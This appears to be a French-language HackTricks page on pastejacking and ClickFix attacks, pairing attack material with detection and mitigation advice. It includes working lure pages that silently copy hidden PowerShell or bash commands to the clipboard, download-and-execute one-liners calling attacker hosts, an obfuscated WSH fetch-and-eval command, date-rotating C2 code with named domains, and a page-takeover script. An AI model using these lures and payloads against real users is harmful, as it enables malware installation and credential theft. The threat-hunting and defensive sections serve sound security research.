# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Ne collez jamais quelque chose que vous n'avez pas vous-même copié." – conseil ancien mais toujours valable

## Aperçu

Le Clipboard hijacking – aussi connu sous le nom de *pastejacking* – exploite le fait que les utilisateurs copient-collent régulièrement des commandes sans les inspecter. Une page web malveillante (ou tout contexte capable d'exécuter JavaScript, comme une application Electron ou une application de bureau) place de façon programmatique du texte contrôlé par l'attaquant dans le presse‑papiers du système. Les victimes sont incitées, généralement par des instructions d'ingénierie sociale soigneusement conçues, à appuyer sur **Win + R** (boîte de dialogue Exécuter), **Win + X** (Quick Access / PowerShell), ou à ouvrir un terminal et à *coller* le contenu du presse‑papiers, exécutant immédiatement des commandes arbitraires.

Parce qu'**aucun fichier n'est téléchargé et qu'aucune pièce jointe n'est ouverte**, la technique contourne la plupart des contrôles de sécurité des e‑mails et du contenu web qui surveillent les pièces jointes, les macros ou l'exécution directe de commandes. L'attaque est donc populaire dans les campagnes de phishing distribuant des familles de malware grand public telles que NetSupport RAT, Latrodectus loader ou Lumma Stealer.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Les campagnes plus anciennes utilisaient `document.execCommand('copy')`, les plus récentes s'appuient sur l'asynchrone **Clipboard API** (`navigator.clipboard.writeText`).

## Flux ClickFix / ClearFake

1. L'utilisateur visite un site typosquatté ou compromis (par ex. `docusign.sa[.]com`)
2. Le JavaScript injecté **ClearFake** appelle un helper `unsecuredCopyToClipboard()` qui stocke silencieusement une one-liner PowerShell encodée en Base64 dans le clipboard.
3. Les instructions HTML disent à la victime : *“Press **Win + R**, paste the command and press Enter to resolve the issue.”*
4. `powershell.exe` s'exécute, téléchargeant une archive qui contient un exécutable légitime plus une DLL malveillante (classic DLL sideloading).
5. Le loader décrypte des étapes supplémentaires, injecte du shellcode et installe de la persistence (par ex. scheduled task) – finissant par exécuter NetSupport RAT / Latrodectus / Lumma Stealer.

### Exemple de chaîne NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (Java WebStart légitime) cherche dans son répertoire le fichier `msvcp140.dll`.
* La DLL malveillante résout dynamiquement les API avec **GetProcAddress**, télécharge deux binaires (`data_3.bin`, `data_4.bin`) via **curl.exe**, les décrypte en utilisant une clé XOR roulante "https://google.com/", injecte le shellcode final et décompresse **client32.exe** (NetSupport RAT) dans `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Télécharge `la.txt` avec **curl.exe**
2. Exécute le downloader JScript dans **cscript.exe**
3. Récupère un payload MSI → dépose `libcef.dll` à côté d'une application signée → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
La commande **mshta** lance un script PowerShell caché qui récupère `PartyContinued.exe`, extrait `Boat.pst` (CAB), reconstruit `AutoIt3.exe` via `extrac32` et concaténation de fichiers, puis exécute un script `.a3x` qui exfiltre les identifiants de navigateurs vers `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Certaines campagnes ClickFix évitent complètement les téléchargements de fichiers et demandent aux victimes de coller un one‑liner qui récupère et exécute du JavaScript via WSH, le persiste, et fait tourner le C2 quotidiennement. Exemple d'enchaînement observé :
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Principales caractéristiques
- URL obfusquée inversée à l'exécution pour contrer l'inspection occasionnelle.
- JavaScript se rend persistant via un Startup LNK (WScript/CScript) et sélectionne le C2 en fonction du jour courant — permettant une rotation rapide des domaines.

Fragment JS minimal utilisé pour faire tourner les C2s par date:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
L'étape suivante déploie couramment un loader qui établit la persistance et récupère un RAT (e.g., PureHVNC), souvent en pinning TLS sur un certificat codé en dur et en découpant le trafic.

Detection ideas specific to this variant
- Arbre de processus: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Artefacts de démarrage: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoquant WScript/CScript avec un chemin JS sous `%TEMP%`/`%APPDATA%`.
- Registre/RunMRU et télémétrie de ligne de commande contenant `.split('').reverse().join('')` ou `eval(a.responseText)`.
- Répétitions de `powershell -NoProfile -NonInteractive -Command -` avec de larges payloads stdin pour alimenter de longs scripts sans longues lignes de commande.
- Scheduled Tasks qui exécutent ensuite des LOLBins tels que `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` sous une tâche/chemin ressemblant à un updater (e.g., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Noms d'hôtes C2 et URLs tournant quotidiennement avec le pattern `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Corréler les événements d'écriture dans le clipboard suivis d'un collage Win+R puis d'une exécution immédiate de `powershell.exe`.

Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` keeps a history of **Win + R** commands – look for unusual Base64 / obfuscated entries.
* Security Event ID **4688** (Process Creation) where `ParentImage` == `explorer.exe` and `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** for file creations under `%LocalAppData%\Microsoft\Windows\WinX\` or temporary folders right before the suspicious 4688 event.
* EDR clipboard sensors (if present) – correlate `Clipboard Write` followed immediately by a new PowerShell process.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Des campagnes récentes produisent en masse de fausses pages de vérification CDN/navigateur ("Just a moment…", IUAM-style) qui contraignent les utilisateurs à copier des commandes spécifiques à l'OS depuis le clipboard vers des consoles natives. Cela fait pivoter l'exécution hors du sandbox du navigateur et fonctionne sur Windows et macOS.

Key traits of the builder-generated pages
- Détection de l'OS via `navigator.userAgent` pour adapter les payloads (Windows PowerShell/CMD vs. macOS Terminal). Leurres/no-ops optionnels pour les OS non pris en charge afin de maintenir l'illusion.
- Copie automatique dans le clipboard lors d'actions UI bénignes (checkbox/Copy) alors que le texte visible peut différer du contenu du clipboard.
- Blocage mobile et un popover avec des instructions pas à pas : Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Obfuscation optionnelle et injecteur en un seul fichier pour écraser le DOM d'un site compromis avec une UI de vérification stylée Tailwind (aucune nouvelle inscription de domaine requise).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence de l'exécution initiale
- Utilisez `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` afin que l'exécution continue après la fermeture du terminal, réduisant les artefacts visibles.

In-place page takeover sur des sites compromis
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Detection & hunting ideas specific to IUAM-style lures
- Web : pages qui lient Clipboard API à des widgets de vérification ; discordance entre le texte affiché et le clipboard payload ; branchement `navigator.userAgent` ; Tailwind + remplacement single-page dans des contextes suspects.
- Endpoint Windows : `explorer.exe` → `powershell.exe`/`cmd.exe` peu de temps après une interaction avec le navigateur ; installateurs batch/MSI exécutés depuis `%TEMP%`.
- Endpoint macOS : Terminal/iTerm lançant `bash`/`curl`/`base64 -d` avec `nohup` proche d'événements du navigateur ; tâches en arrière-plan survivant à la fermeture du terminal.
- Corréler l'historique `RunMRU` Win+R et les écritures clipboard avec la création ultérieure de processus console.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Mesures d'atténuation

1. Renforcement du navigateur – désactiver l'accès en écriture au clipboard (`dom.events.asyncClipboard.clipboardItem` etc.) ou exiger un geste utilisateur.
2. Sensibilisation à la sécurité – apprendre aux utilisateurs à *taper* les commandes sensibles ou à les coller d'abord dans un éditeur de texte.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control pour bloquer les one-liners arbitraires.
4. Contrôles réseau – bloquer les requêtes sortantes vers des domaines connus de pastejacking et de C2 de malware.

## Astuces associées

* **Discord Invite Hijacking** abuse souvent de la même approche ClickFix après avoir attiré les utilisateurs dans un serveur malveillant :

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Références

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)

{{#include ../../banners/hacktricks-training.md}}
